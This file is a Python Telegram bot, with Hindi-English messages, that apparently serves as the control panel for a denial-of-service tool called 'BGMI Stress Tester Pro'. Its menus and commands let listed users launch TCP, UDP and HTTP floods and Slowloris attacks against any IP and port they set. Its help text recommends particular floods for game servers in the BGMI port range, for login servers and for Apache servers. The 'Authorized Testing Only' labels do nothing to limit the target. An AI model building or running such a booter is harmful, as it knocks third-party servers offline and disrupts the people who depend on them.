#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import sys
import os
import time
from datetime import datetime
from telethon import TelegramClient, events, Button
from colorama import Fore, Style, init

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import config
from modules.tcp_flood import TCPFlood
from modules.udp_flood import UDPFlood
from modules.http_flood import HTTPFlood
from modules.slowloris import Slowloris
from modules.utils import AttackUtils

init(autoreset=True)

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

print(AttackUtils.get_banner())

# Initialize bot
bot = TelegramClient(
    os.path.join(config.SESSION_DIR, 'bot'),
    config.API_ID,
    config.API_HASH
).start(bot_token=config.BOT_TOKEN)

# Attack instances
attackers = {
    'tcp': TCPFlood(),
    'udp': UDPFlood(),
    'http': HTTPFlood(),
    'slowloris': Slowloris()
}

active_attacks = {}

def is_authorized(user_id):
    return user_id in config.AUTHORIZED_USERS

# ============================================
# /start COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if not is_authorized(event.sender_id):
        await event.reply("❌ **Access Denied!** Aap authorized nahi hain.")
        return
    
    user = event.sender.first_name or "Tester"
    
    welcome = f"""
🔥 **BGMI STRESS TESTER PRO v3.0** 🔥

━━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 **Welcome, {user}!**
✅ **Authorized Testing Mode Active**
━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 **Current Target:**
🎯 IP: `{config.TARGET_IP}`
🔌 Port: `{config.TARGET_PORT}`
🧵 Max Threads: `{config.MAX_THREADS}`
⏱️ Max Duration: `{config.MAX_DURATION}s (10 min)`

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ **Attack Methods Available:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 **TCP Flood** - TCP connections overload
🔸 **UDP Flood** - Game protocol flood
🔹 **HTTP Flood** - Web request flood  
🔸 **Slowloris** - Slow connection attack

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **Authorized Testing Only**
━━━━━━━━━━━━━━━━━━━━━━━━━━━

👇 **Attack method select karein:**
"""
    
    buttons = [
        [Button.inline("🔹 TCP FLOOD", b"attack_tcp"),
         Button.inline("🔸 UDP FLOOD", b"attack_udp")],
        [Button.inline("🔹 HTTP FLOOD", b"attack_http"),
         Button.inline("🔸 SLOWLORIS", b"attack_slowloris")],
        [Button.inline("━━━━━━━━━━━━━━━━━━━", b"sep")],
        [Button.inline("⏱️ CUSTOM DURATION", b"custom_duration"),
         Button.inline("⚙️ CUSTOM THREADS", b"custom_threads")],
        [Button.inline("⛔ STOP ATTACK", b"stop"),
         Button.inline("📊 STATUS", b"status")],
        [Button.inline("❓ HELP", b"help")]
    ]
    
    await event.reply(welcome, buttons=buttons)

# ============================================
# BUTTON HANDLER
# ============================================
@bot.on(events.CallbackQuery)
async def button_handler(event):
    sender_id = event.sender_id
    if not is_authorized(sender_id):
        await event.answer("❌ Unauthorized!", alert=True)
        return
    
    data = event.data.decode()
    
    # Attack handlers
    if data.startswith("attack_"):
        method = data.replace("attack_", "")
        
        if sender_id in active_attacks:
            await event.answer("⚠️ Pehle se attack chal raha hai! Pehle stop karein.", alert=True)
            return
        
        # Default values
        duration = config.DEFAULT_DURATION
        threads = config.MAX_THREADS
        
        # Check if user wants custom values (stored in user data)
        # For simplicity, using defaults
        
        method_names = {
            'tcp': '🔹 TCP FLOOD',
            'udp': '🔸 UDP FLOOD (BGMI)',
            'http': '🔹 HTTP FLOOD',
            'slowloris': '🔸 SLOWLORIS'
        }
        
        method_name = method_names.get(method, "UNKNOWN")
        
        attack_msg = f"""
⚔️ **{method_name}** STARTED ⚔️

━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:** `{config.TARGET_IP}:{config.TARGET_PORT}`
🧵 **Threads:** `{threads}`
⏱️ **Duration:** `{duration}s`
━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔥 **Attack in progress...**
📊 Report auto-generate hogi jab attack complete hoga.
"""
        
        await event.edit(attack_msg)
        active_attacks[sender_id] = method
        
        try:
            report = attackers[method].start_attack(
                config.TARGET_IP,
                config.TARGET_PORT,
                threads,
                duration
            )
            
            active_attacks.pop(sender_id, None)
            
            elapsed_str = AttackUtils.format_time(report['elapsed'])
            
            result_msg = f"""
✅ **ATTACK COMPLETE** ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **STATISTICS REPORT**
━━━━━━━━━━━━━━━━━━━━━━━━━━━

📦 **Packets Sent:** `{report['packets']:,}`
📤 **Data Transferred:** `{AttackUtils.format_bytes(report['bytes'])}`
🔗 **Connections Made:** `{report['connections']:,}`
❌ **Errors:** `{report['errors']}`
⏱️ **Elapsed Time:** `{elapsed_str}`
⚡ **Packet Rate:** `{report['packet_rate']:.2f} pkt/s`
🔗 **Conn Rate:** `{report['conn_rate']:.2f} conn/s`
📶 **Bandwidth:** `{report['mbps']:.2f} Mbps`

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ **Method:** {method_name}
🎯 **Target:** `{config.TARGET_IP}:{config.TARGET_PORT}`
🧵 **Threads:** `{threads}`
⏱️ **Duration:** `{duration}s`
━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔄 /start se wapas main menu
"""
            await event.edit(result_msg)
            
        except Exception as e:
            active_attacks.pop(sender_id, None)
            await event.edit(f"❌ Attack failed! Error: {str(e)}\n\n🔄 /start")
    
    # STOP
    elif data == "stop":
        if sender_id not in active_attacks:
            await event.answer("⚠️ Koi active attack nahi hai!", alert=True)
            return
        
        method = active_attacks[sender_id]
        attackers[method].stop_attack()
        active_attacks.pop(sender_id, None)
        
        await event.edit("⛔ **ATTACK STOPPED** ⛔\n\nSabhi connections close.\n\n🔄 /start")
        await event.answer("✅ Stopped!", alert=True)
    
    # STATUS
    elif data == "status":
        if sender_id in active_attacks:
            await event.answer(f"⚔️ Active: {active_attacks[sender_id].upper()} chal raha hai!", alert=True)
        else:
            await event.answer("💤 No active attack.", alert=True)
    
    # CUSTOM DURATION
    elif data == "custom_duration":
        await event.edit(
            "⏱️ **Custom Duration**\n\n"
            "Duration set karne ke liye:\n"
            "`/duration 10` - 10 seconds\n"
            "`/duration 300` - 5 minutes\n"
            "`/duration 600` - 10 minutes (max)\n\n"
            f"Max allowed: {config.MAX_DURATION} seconds\n\n"
            "🔄 /start - Back"
        )
    
    # CUSTOM THREADS
    elif data == "custom_threads":
        await event.edit(
            "⚙️ **Custom Threads**\n\n"
            "Threads set karne ke liye:\n"
            "`/threads 100` - 100 threads\n"
            "`/threads 500` - 500 threads\n"
            "`/threads 1000` - 1000 threads (max)\n\n"
            f"Max allowed: {config.MAX_THREADS}\n\n"
            "🔄 /start - Back"
        )
    
    # HELP
    elif data == "help":
        await event.edit(
            "❓ **HELP** ❓\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "**Attack Methods:**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔹 **TCP Flood**\n"
            "• SYN/ACK flood attack\n"
            "• Server connection pool exhaust\n"
            "• Best for: Game login servers\n\n"
            "🔸 **UDP Flood (BGMI)**\n"
            "• Game protocol packets\n"
            "• BGMI port range (7000-15000)\n"
            "• Best for: Game servers\n\n"
            "🔹 **HTTP Flood**\n"
            "• Layer 7 GET requests\n"
            "• Random endpoints\n"
            "• Best for: Web/API servers\n\n"
            "🔸 **Slowloris**\n"
            "• Partial HTTP requests\n"
            "• Keep connections hanging\n"
            "• Best for: Apache servers\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "**Commands:**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "`/start` - Main menu\n"
            "`/duration <sec>` - Custom duration\n"
            "`/threads <num>` - Custom threads\n"
            "`/stop` - Stop attack\n"
            "`/help` - Help menu\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **Authorized Testing Only**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔄 /start - Back"
        )
    
    elif data == "sep":
        await event.answer("")

# ============================================
# /duration COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/duration'))
async def set_duration(event):
    if not is_authorized(event.sender_id):
        return
    
    try:
        parts = event.text.split()
        if len(parts) < 2:
            await event.reply("⚠️ Usage: `/duration 60` (seconds)")
            return
        
        dur = int(parts[1])
        if dur < 1 or dur > config.MAX_DURATION:
            await event.reply(f"⚠️ Duration 1 se {config.MAX_DURATION} seconds ke beech hona chahiye.")
            return
        
        config.DEFAULT_DURATION = dur
        await event.reply(f"✅ Duration set to `{dur}` seconds ({AttackUtils.format_time(dur)})")
        
    except ValueError:
        await event.reply("⚠️ Invalid number. Use: `/duration 60`")

# ============================================
# /threads COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/threads'))
async def set_threads(event):
    if not is_authorized(event.sender_id):
        return
    
    try:
        parts = event.text.split()
        if len(parts) < 2:
            await event.reply("⚠️ Usage: `/threads 500`")
            return
        
        thr = int(parts[1])
        if thr < 1 or thr > config.MAX_THREADS:
            await event.reply(f"⚠️ Threads 1 se {config.MAX_THREADS} ke beech hona chahiye.")
            return
        
        config.MAX_THREADS = thr
        await event.reply(f"✅ Threads set to `{thr}`")
        
    except ValueError:
        await event.reply("⚠️ Invalid number. Use: `/threads 500`")

# ============================================
# /stop COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_command(event):
    if not is_authorized(event.sender_id):
        return
    
    if event.sender_id in active_attacks:
        method = active_attacks[event.sender_id]
        attackers[method].stop_attack()
        active_attacks.pop(event.sender_id, None)
        await event.reply("⛔ **Attack Stopped!**")
    else:
        await event.reply("💤 Koi active attack nahi hai.")

# ============================================
# /target COMMAND (Custom target set)
# ============================================
@bot.on(events.NewMessage(pattern='/target'))
async def set_target(event):
    if not is_authorized(event.sender_id):
        return
    
    try:
        parts = event.text.split()
        if len(parts) < 2:
            await event.reply("⚠️ Usage: `/target 192.168.1.100 8080`")
            return
        
        ip = parts[1]
        port = int(parts[2]) if len(parts) > 2 else config.TARGET_PORT
        
        config.TARGET_IP = ip
        config.TARGET_PORT = port
        await event.reply(f"✅ Target set to `{ip}:{port}`")
        
    except:
        await event.reply("⚠️ Usage: `/target IP PORT`")

# ============================================
# /info COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/info'))
async def info_command(event):
    if not is_authorized(event.sender_id):
        return
    
    info = f"""
ℹ️ **Bot Information**

━━━━━━━━━━━━━━━━━━━━━━━━━━━
🤖 **Name:** BGMI Stress Tester Pro
📌 **Version:** v3.0
📅 **Status:** ✅ Online

━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:**
• IP: `{config.TARGET_IP}`
• Port: `{config.TARGET_PORT}`
• Threads: `{config.MAX_THREADS}`
• Duration: `{config.DEFAULT_DURATION}s`

━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 **Your ID:** `{event.sender_id}`
🔑 **Authorized:** ✅ Yes
━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    await event.reply(info)

# ============================================
# MAIN
# ============================================
async def main():
    print(f"{Fore.GREEN}[✓] Bot Started!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Target: {config.TARGET_IP}:{config.TARGET_PORT}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Max Duration: {config.MAX_DURATION}s | Threads: {config.MAX_THREADS}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[+] Waiting for commands...{Style.RESET_ALL}")
    print("-" * 50)
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Bot stopped.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        logger.error(f"Error: {e}", exc_info=True)
